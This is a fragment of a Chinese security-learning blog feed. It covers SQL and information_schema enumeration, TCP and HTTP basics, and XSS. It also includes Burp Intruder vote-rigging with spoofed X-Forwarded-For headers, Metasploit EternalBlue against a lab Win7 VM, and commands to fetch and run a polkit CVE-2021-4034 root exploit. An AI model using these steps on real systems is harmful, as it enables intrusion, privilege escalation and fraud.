src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="1-and"><a href="#1-and" class="headerlink" title="1.and"></a>1.and</h4><p><code>select * from url where id &gt; 1 and (country = &#39;cn&#39;);</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412220121.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="2-符号"><a href="#2-符号" class="headerlink" title="2.符号"></a>2.符号</h4><p><code>select * from url where id &lt;&gt; 1;</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412220217.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="3-in"><a href="#3-in" class="headerlink" title="3.in"></a>3.in</h4><p><code>select * from url where id in(1);</code>()里还可以加很多,&#x3D;只能有一个,()里可以填很多数据<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412220245.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="4-like"><a href="#4-like" class="headerlink" title="4.like"></a>4.like</h4><p><code>select * from url where name like &#39;%o%&#39;</code><br>like 是模糊搜索,% 表示多个字值，<code>_ </code>下划线表示一个字符</p><ol><li>%o%是内容包含o</li><li>%o<code>_</code> : 表示查询以o在倒数第二位的所有内容</li><li>%o表示o在最后一位</li><li><code>%</code>代表0个或多个字符<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412220405.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412220737.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412220737.png" alt="img"></a></li></ol><h4 id="5-or"><a href="#5-or" class="headerlink" title="5.or"></a>5.or</h4><p><code>select * from url where id = 1 or country = &#39;us&#39;;</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412221354.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="6-排序"><a href="#6-排序" class="headerlink" title="6.排序"></a>6.排序</h4><p><code>select * from url order by arr;</code><br>排序,默认是asc(从小到大),也可以改成desc(从大到小)<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412223302.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412223302.png" alt="img"></a></p><h4 id="7-limit"><a href="#7-limit" class="headerlink" title="7.limit"></a>7.limit</h4><p><code>select * from url limit 2;</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412225558.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412225558.png" alt="img"></a></p><h4 id="8-别名"><a href="#8-别名" class="headerlink" title="8.别名"></a>8.别名</h4><p><code>select name as n from url;</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413144123.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br><code>select concat(url,name) as ue from url;</code><br>concat是一个连接函数<br><code>select id,concat(url,name) as ue from url;</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413144833.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="9-函数"><a href="#9-函数" class="headerlink" title="9.函数"></a>9.函数</h4><p>count计数<br><code>select count(*) from url;</code> ()里的可以是任意内容<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413152835.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br>sum求和<br><code>select sum(id) from url;</code>如果不是int类型的话返回0<br>avg()求平均值 min() max()<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413153140.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="10-having"><a href="#10-having" class="headerlink" title="10.having"></a>10.having</h4><p><code>select * from url group by arr having id&gt;1;</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413162307.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h3 id="4-子查询"><a href="#4-子查询" class="headerlink" title="4.子查询"></a>4.子查询</h3><h4 id="1-where"><a href="#1-where" class="headerlink" title="1.where"></a>1.where</h4><p>把where查询的结果当做一个条件来查询<br><code>select * from url where id in (select id from url where id&gt;1);</code><br>注意子查询中select的内容和外部查询的是否能匹配上,不要出现单对多的查询结果,<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413165510.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h4 id="2-from"><a href="#2-from" class="headerlink" title="2.from"></a>2.from</h4><p><code>select * from (select * from url where id &gt; 1)as huhu;</code>子查询查出来的是集合,集合别名是huhu<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413170441.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413170441.png" alt="img"></a></p><h4 id="3-exists-有点类似布尔的感觉"><a href="#3-exists-有点类似布尔的感觉" class="headerlink" title="3.exists(有点类似布尔的感觉)"></a>3.exists(有点类似布尔的感觉)</h4><p><code>select * from url where exists (select * from url where id&gt;1);</code><br>exists()括号内的内容只要能有返回值即为1,否则判断为0<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413171142.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230413171142.png" alt="img"></a></p><h4 id="4-union"><a href="#4-union" class="headerlink" title="4.union"></a>4.union</h4><p><code>select * from url union select *,1,2 from new;</code>两个表一起查询,如果表的列数不一样的话,就可以在select 后面加上预设的值<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230414202948.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230414202948.png" alt="img"></a></p><h4 id="5-内连接-左右链接"><a href="#5-内连接-左右链接" class="headerlink" title="5.内连接 左右链接"></a>5.内连接 左右链接</h4><p>1.内连接(交集)<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230417172159.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230417172159.png" alt="img"></a><br>a表<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230417171042.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230417171042.png" alt="img"></a><br>b表<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230417171118.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230417171118.png" alt="img"></a><br><code>select * from a_user a inner join b_class b on a.class_id=b.user_id</code><br>一.<code>select * from a_user a</code>a_user 和a之间省略了as,即让a变为a_user的别名<br>二.<code>inner join b_class</code>这步是连接b表<br>三.<code>a.class_id=b.user_id</code>这步是让a.class_id中的值与b.user_id的相等的值可以被查询出来<br>2.左(右)连接<br><code>SELECT * FROM a_user a LEFT JOIN b_class b ON a.class_id = b.user_id</code><br>left&#x2F;right<br>join左边的是左表,右边的是右表,左连接返回左表中所有记录,右连接同理</p><h3 id="5-跨库查询-information-schema和sql注入"><a href="#5-跨库查询-information-schema和sql注入" class="headerlink" title="5.跨库查询(information schema和sql注入)"></a>5.跨库查询(information schema和sql注入)</h3><h4 id="1-查询库"><a href="#1-查询库" class="headerlink" title="1.查询库"></a>1.查询库</h4><p><code>select schema_name from information_schema.schemata limit 1,1</code><br>LIMIT 1,1 指定了返回结果的起始位置和数量。第一个数字 1 表示起始位置，第二个数字 1 表示返回的结果数量。<br>类似于show databases;但是show databases是mysql特有的语法,而以上的查询库的方法适用于所有sql语法</p><h4 id="2-查询表"><a href="#2-查询表" class="headerlink" title="2.查询表"></a>2.查询表</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="3-查询表的信息"><a href="#3-查询表的信息" class="headerlink" title="3.查询表的信息"></a>3.查询表的信息</h4><p><code>select * from information_schema.TABLES where (TABLE_SCHEMA=&#39;test&#39; and )table_name=&#39;a_user&#39;</code><br>括号内可删除<br>类似于desc a_user;<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230417192136.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><h1 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h1><h2 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h2><p>1.<code>https://github.com/sqlmapproject/sqlmap</code>官网下载<br>2.新建文件夹sqlmap<code>git clone https://github.com/sqlmapproject/sqlmap.git</code><br>3.安装python2.x版本,配置环境<br>4.在sqlmap的文件夹下打开命令行,<code>sqlmap.py</code> <code>sqlmap.py -h</code>出现图标即为成功(视频演示的是<code>sqlmap -h</code>不知道为什么我的必须加上.py)</p><h2 id="2-burp-suite"><a href="#2-burp-suite" class="headerlink" title="2.burp suite"></a>2.burp suite</h2><p>1.安装java,配置环境<br>2.一路next</p><h2 id="3-端口"><a href="#3-端口" class="headerlink" title="3.端口"></a>3.端口</h2><ol><li>tcp端口<br>传输控制协议端口,要在客户端和服务端建立连接(安全性好)</li><li>udp端口<br>用户数据包协议端口,不用建立连接(安全不好)</li></ol><p>常见端口1024-49151(1023及之前是预留端口)</p><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><ol><li><code>netstat -ano</code> 查看所有端口</li><li><code>netstat -ano | findstr &quot;8080&quot;</code>查询8080端口是否被占用(445是永恒之蓝)</li></ol><h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><ol><li>listening 端口已激活,等待外部请求</li><li>established 三次握手完后,建立连接,此时主机端口是established状态</li><li>close_wait 对方(服务端)切断连接</li><li>time_wait 我方使用close()主动断开连接,服务器会等待一段时间,等待再次连接,直到再次连接或者超过一定时间时再释放被占用的资源,而syn攻击就是利用这点,不断向服务器发起tcp连接,占用服务器资源</li></ol><h2 id="4-tcp协议"><a href="#4-tcp协议" class="headerlink" title="4.tcp协议"></a>4.tcp协议</h2><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230505143713.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">客户端              <br>             发送syn报文                         <br>                            服务端<br>            发送syn+ack<br>客户端<br>            发送ack<br>                            服务端<br></code></pre></td></tr></table></figure><h3 id="wireshark抓包"><a href="#wireshark抓包" class="headerlink" title="wireshark抓包"></a>wireshark抓包</h3><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230418201237.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230418201237.png" alt="img"></a><br>三次握手与四次挥手<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230505144059.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230505144059.png" alt="img"></a><br>Fin finish<br>Ack acknowledge<br>Win window 表示接收窗口的大小,用来控制传输方的数据发送量<br>Seq Sequence Number 序列号<br>Len 数据字段的长度</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安全笔记1</title>
    <link href="/2023/08/20/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B01/"/>
    <url>/2023/08/20/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>安全方面其实学了挺久的了,但太乱太杂没咋记笔记,现在想想还是得写点东西的,要不然真记不住,比如html(能看懂最简单的代码),css(几乎没学),js(学了点请求的语法),sql(能看懂一点?),还有各种乱七八糟的工具,sqlmap,ssms,docker啥的,学了但是都不精,还是得系统的学,但愿我能忍受小迪的口音,但愿小迪的课我能听懂(各种意义上)</p><h2 id="Day-1-基础入门-概念名词"><a href="#Day-1-基础入门-概念名词" class="headerlink" title="Day 1 基础入门 -概念名词"></a>Day 1 基础入门 -概念名词</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>url(locate)统一资源<em>定位</em>符 专门标识互联网资源位置<br>uri(identifier)统一资源<em>标识</em>符 包含url urn等等,标识各种不同资源,不仅仅是web<br>网址 是url的一种</p><h3 id="2-域名"><a href="#2-域名" class="headerlink" title="2.域名"></a>2.域名</h3><p><a href="http://www.example.com/">www.example.com</a><br>需要注册才能使用,比如阿里云,腾讯云等<br>存在二级域名,多级域名<br>www. 为顶级域,加不加都可以访问,比如<a href="http://www.baidu.com/">www.baidu.com</a>, 也可以直接baidu.com<br>news.baidu.com , tieba.baidu.com就是二级域名<br>shehui.news.baidu.com就是三级域名<br>在渗透的时候主站(顶级域)打不进去,可以试着收集子级域</p><h3 id="3-DNS-在橙果学过一些"><a href="#3-DNS-在橙果学过一些" class="headerlink" title="3.DNS(在橙果学过一些)"></a>3.DNS(在橙果学过一些)</h3><p>C\Windows\System32\driver\etc\hosts 里打开hosts文件,可以增添或删减IP地址,用于重定向的解析的IP地址,起到一个类似dns的作用(或者dns是起到这个hosts的作用?)<br>要是黑进别人电脑打开cmd,可以更改别人的hosts文件,选定几个常用的域名并更改IP地址到自己制作的钓鱼网站就算是攻击了<br>小迪讲的steam的例子,如果下外非国区游戏,一些加速器就会更改hosts文件,让下载的访问地址由访问国外改到访问国内的缓存下载,这么说随便一个加速器都能改hosts文件,确实有种在网上干啥都不安全的感觉</p><h3 id="4-CDN-内容分部网络"><a href="#4-CDN-内容分部网络" class="headerlink" title="4.CDN (内容分部网络)"></a>4.CDN (内容分部网络)</h3><p>可以理解为缓存节点,比如主站部署在济南,别的地区例如广州想要访问网站速度肯定不如在济南的快,假如在长沙有一个cdn节点,广州地区的人访问长沙的cdn节点就会比访问济南的快.<br>cdn节点能访问的是缓存(类似镜像站?),如果要扫描网站的话核心数据都在主站,而扫描cdn节点就是没有意义的<br>dns更换,但是cdn节点会根据地区就近给你分配,即便更改dns,也还是会按地区就近让你访问cdn节点的缓存内容</p><h3 id="5-脚本语言"><a href="#5-脚本语言" class="headerlink" title="5.脚本语言"></a>5.脚本语言</h3><p>得去了解一下框架是啥</p><h3 id="6-漏洞"><a href="#6-漏洞" class="headerlink" title="6.漏洞"></a>6.漏洞</h3><p>web源码类漏洞:sql注入,上传,xss,代码执行,反序列化<br>web中间件(比如阿帕奇,tomcat,nginx):<br>web数据库:弱口令<br>web操作系统:提权漏洞<br>其它第三方:</p><h2 id="Day-2-数据包"><a href="#Day-2-数据包" class="headerlink" title="Day 2.数据包"></a>Day 2.数据包</h2><p>麻了,昨天写的数据包笔记忘保存了,又得重写一遍</p><h3 id="1-http请求-request-报文"><a href="#1-http请求-request-报文" class="headerlink" title="1.http请求(request)报文"></a>1.http请求(request)报文</h3><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230326200537.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230326200537.png" alt="img"></a></p><ol><li>请求行: 请求方式 请求的url资源路径 协议版本 (请求行之后的是首部行)<br>GET &#x2F;somedir&#x2F;page.html HTTP&#x2F;1.1</li><li>Host: <a href="http://www.baidu.com/">www.baidu.com</a> 对象所在的主机</li><li>Connection: close 表示服务器收到并返回客户端发送的请求后,与客户端断开网络连接</li><li>User-agent: Mozilla&#x2F;5.0 表明用户所使用的的是什么浏览器</li><li>connection:连接方式 HTTP&#x2F;1.1 的默认连接方式为Keep-Alive,即一直保持联系<br>6.cookie</li><li>referer:表明发送请求的网址的url,告诉服务器这个请求是从什么网站来的(跟host好像有点类似)</li></ol><p>若用post请求,则在最后会有空行,跟着post请求的值</p><h3 id="2-返回-response-报文"><a href="#2-返回-response-报文" class="headerlink" title="2.返回(response)报文"></a>2.返回(response)报文</h3><p>1.状态行<br>HTTP&#x2F;1.1 200 OK 状态行会显示协议版本,以及响应状态(1xx:请求中 200:成功 3xx:重定向 4xx:资源不存在或转移 5xx:服务器出问题)<br>2.响应头标<br>Date<br>Server:Apache(中间件) win32(操作系统)<br>3.空行<br>4.响应数据</p><h3 id="3-xss攻击"><a href="#3-xss攻击" class="headerlink" title="3.xss攻击"></a>3.xss攻击</h3><p>记录一下,学到现在为止接触的第一个攻击实战xss<br>原理:在访问网站的时候可能会被抓包,抓包以后可能会被修改响应数据(或者别的数据)<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230328192445.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230328192445.png" alt="来自chatgpt的解释"></a><br>(看来我理解的还可以),小迪演示的是在用burp抓包后,在html代码里加了一一个弹窗警告,如果改成恶意脚本,应该就是xss攻击了<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230328234826.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230328234826.png" alt="img"></a><br>好好好好好好好好好好,折磨我一晚上的burp可算下好了,又捐助52破解账号,又注册甲骨文账号,还配了个java环境,重启好几次,搜了n多教程,可算把burp搞下来了</p><h3 id="4-burp-suite"><a href="#4-burp-suite" class="headerlink" title="4.burp suite"></a>4.burp suite</h3><p>2023&#x2F;3&#x2F;29,第一次实战打靶成功<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329192307.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a>可喜可贺<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329192438.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329192438.png" alt="img"></a><br>第二次<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329193928.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329193928.png" alt="img"></a>有点难崩,出现了,面向csdn编程<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329193944.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329193944.png" alt="img"></a><br>详细搞下第三题把,get改post,一开始是bp右键一键更改的,虽然能过,但想了想还是不能当脚本小子,得去学学原理<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329195027.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329195027.png" alt="img"></a><br>get产生一个tcp数据包(不是很懂什么叫tcp数据包)是把header跟data一起发送给服务器,服务器直接响应200,发送的数据在2-16k之间,而post是产生两个tcp数据包,先向服务器发送header,响应100以后,在发送data,服务器响应200,data没有内存限制</p><p>get改post</p><h4 id="1-改请求行"><a href="#1-改请求行" class="headerlink" title="1.改请求行"></a>1.改请求行</h4><p>GET改为POST</p><h4 id="2-数据放在最后"><a href="#2-数据放在最后" class="headerlink" title="2.数据放在最后"></a>2.数据放在最后</h4><p>content&#x3D;</p><h4 id="3-加东西"><a href="#3-加东西" class="headerlink" title="3.加东西"></a>3.加东西</h4><p>Content-Type:application&#x2F;x-www-form-urlencoded<br>Content-Length:（请求的内容长度)(包括content&#x3D;)(这一行不写也能过,不知道为什么,是bug还是火狐特性?)</p><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/]Z9I%%605TFP%J_91S%60~SQ%7BIC.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/BRE%7BNKOS%60Y2~HY%~W]QAQ6P.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br>人生中第一次刷票,成功了,记录一下知识点,顺便记录一下爆破的用法<br>X-Forwarded-For:(IP地址) 这一行最好不要写在请求报文的最后,写在中间随便找个地方应该就行,原理未知,但是放在最后一行会报错<br>1.选定要改变的数字发送到intruder,注意可能有默认的payload选定,这里最好先清空payload<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329220336.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329220336.png" alt="img"></a><br>2.然后选定要改变的数字为payload,两个及以上(perhaps)选择集束炸弹(Clusterbomb),然后选择payload选项<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329220514.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230329220514.png" alt="img"></a>选择payload集,选择数值类型,在选定from和to,注意要写数字间隔,然后就可以开始爆破了</p><h3 id="Day-3-搭建安全环境"><a href="#Day-3-搭建安全环境" class="headerlink" title="Day 3.搭建安全环境"></a>Day 3.搭建安全环境</h3><p>用ip地址访问网站能得到比用域名访问网站更多的东西</p><h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><h5 id="msf使用"><a href="#msf使用" class="headerlink" title="msf使用"></a>msf使用</h5><ol><li>msfconsole 启动msf</li><li>search msXXXX<br>search ms17_010 (搜索永恒之蓝)<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331152509.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331152509.png" alt="img"></a></li><li>use X<br>use 0</li><li>(show) options 展示选项<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331152730.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br>带yes的是必须设置的,而目前只有RHOSTS未设置<br>(累死了,又累又饿,中间出了一堆事,先是win7搞激活秘钥弄了很久,然后是kali没法ping通win7,本来以为是kali设置的问题,试了n次以后发现是win7的原因,ping通之后msf还是run不动,又捣鼓半天最后把win7防火墙关了才好使)</li><li>set RHOST (ipv4地址)</li><li>set LPORT (这步可跳过)</li><li>run获得meterpreter<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331174319.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></li></ol><h6 id="悲"><a href="#悲" class="headerlink" title="悲"></a>悲</h6><p>单独记录一下搞定msf中间的一堆设置</p><ol><li><p>kali在ping win7的时候ping不通,因为是在msf里面ping的,我以为是我msf没设置好,又重开了terminal好几次重新试,但一ping就卡死,在网上搜索虚拟机互相ping的问题,给出的答案基本都是更改网络设置,改成桥接或者nat,但是换别的就会显示虚拟机连不上网,所以放弃.继而尝试ping其它ip,比如baidu.com,我的博客的域名,手机的ip地址都能够ping成功,这时猜测可能是win7的原因,用主机ping了一下win7的ip,发现也ping不通,但ping别的ip都可以,此时问题锁定在win7上了,懒得再去垃圾堆里找宝贝,直接问的gpt</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall show allprofiles<br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;ICMP Allow incoming V4 echo request&quot;</span> <span class="hljs-attribute">protocol</span>=icmpv4:8,any <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure></li><li><p>经过gpt帮助后,win7虚拟机已经能ping通了,继续尝试run<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331175242.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a>但还是显示超时,想继续去找gpt求助,奈何莫名其妙到1h限制了,继续在csdn找原因,<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331175356.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331175356.png" alt="img"></a>看到了这个,尝试之后kali显示的是filtered(筛选,过滤),新问题又来了,win7的445端口没打开,继续去找答案,网上找的基本都是win r regedit的方法,但是跟做之后都不行,最后直接把防火墙关了,run通了<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331175703.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230331175703.png" alt="img"></a></p></li></ol><h5 id="LANMP"><a href="#LANMP" class="headerlink" title="LANMP"></a>LANMP</h5><p>一个打包的环境,包括php,mysql,Appache等<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230424185857.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230424185857.png" alt="img"></a><br>安装(kali):<br><code>wget http://dl.wdlinux.cn/files/lanmp_v3.tar.gz</code><br>wget是类似git clone的操作<br><code>tar xzvf lanmp_v3.tar.gz</code><br>tar是解压的命令,常用是<code>tar [选项] &lt;压缩或解压文件&gt;</code></p><ul><li>c:创建一个压缩文件</li><li>x:解压或提取压缩文件</li><li>z:用 gzip 格式压缩&#x2F;解压文件</li><li>v:显示详细的处理过程</li><li>f:指定档案文件名</li></ul><p><code>sudo sh lanmp.sh</code><br>遇到了49 76的报错,按照网上说的<code>sudo dpkg-reconfigure dash</code>并没有提示让我选no的选项,接着找到<code>ls -al /bin/sh</code> 显示的dash,要改成bash<code>sudo ln -fs /bin/bash /bin/sh</code> 在执行<code>apt install cmake</code>安装cmake</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试</title>
    <link href="/2023/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2023/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="ip信息"><a href="#ip信息" class="headerlink" title="ip信息"></a>ip信息</h3><ol>    <li>ifconfig</li>(查看攻击机ip)192.168.22.129    <li>nmap -sP 192.168.22.129/24 </li>寻找靶机ip(192.168.1.2)    <li>nmap -A 192.168.1.2</li>查找靶机开放的端口,DNS服务,版本信息</ol><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>    <li>看端口是否有22,80,443,8080,8080端口可以直接192.168.1.2:8080可以直接在页面访问</li>    <li>有DNS服务,如果有的话</li>        <ol>            <li>vim /etc/hosts</li>            <li>按i进行输入   192.168.22.132 DNS域名地址  </li>            <li>esc  :wq</li>        </ol>    <li>看系统版本信息</li>        <ul>            <li>polkit提权  CVE-2021-4034</li>            <ol>                <li>git clone https://github.com/berdav/CVE-2021-4034</li>                <li>cd CVE-2021-4034</li>                <li>make</li>                <li>./cve-2021-4034</li>            </ol>        </ul></ul><h3 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h3><ul>    <li>dirb</li>        <ol>            <li>dirb http://earth.local</li>            <li>dirb http://192.168.2.1:8080</li>        </ol>    <li>gobuster</li>        <ul>            <li>gobuster dir -u https://earth.local -u https://terratest.earth.local -k  -w /root/桌面/gobuster/SecLists/Discovery/Web-Content/common.txt</li>        </ul>    <li>报错提示</li>        192.168.1.1:8080/dscvhjc    随便输点,看页面报错信息</ul>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>系统</title>
    <link href="/2023/08/20/%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/08/20/%E7%B3%BB%E7%BB%9F/</url>
    
